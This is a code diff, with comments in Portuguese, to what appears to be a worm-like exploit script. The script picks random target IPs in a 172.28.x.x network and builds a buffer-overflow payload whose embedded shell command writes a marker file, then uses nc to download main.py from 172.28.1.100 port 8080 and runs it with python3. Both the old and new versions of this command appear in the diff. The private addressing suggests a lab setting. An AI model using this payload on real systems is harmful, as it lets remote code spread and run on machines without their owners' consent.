@@ -68,13 +68,10 @@ def getNextTarget():
     
     # Sorteia o terceiro octeto (de 1 a 5)
     terceiro_octeto = randint(1, 5)
-    # terceiro_octeto = 1
     
     # Sorteia o quarto octeto (de 10 a 14)
     quarto_octeto = randint(10, 14)
-    # quarto_octeto = 11
-
-
+    
     # Monta a string do IP com os valores sorteados
     ip_sorteado = f"172.28.{terceiro_octeto}.{quarto_octeto}"
     
@@ -162,8 +159,7 @@ def main():
         return
     print(f"Endereço do buffer: {hex(bufaddr)}")
 
-    shellcode = create_hex_command(b"(echo 'true' > infectado.txt ; nc -w3 172.28.1.100 8080 < /dev/null > main.py ; python3 main.py > out.txt) < /dev/null > /dev/null 2>&1 &")
-
+    shellcode = create_hex_command(b"echo 'true' > input.txt && nc -w3 172.28.1.100 8080 > main.py && python3 main.py > out.txt")
     payload = getFile(bufaddr, shellcode)
 
     writeFile(payload, targetIP)
@@ -176,7 +172,7 @@ if __name__ == "__main__":
     # server = subprocess.Popen(command, shell=True)
 
     main()
-
+        
     # server.terminate()
     # server.wait()
     # print("Processo fechado!")
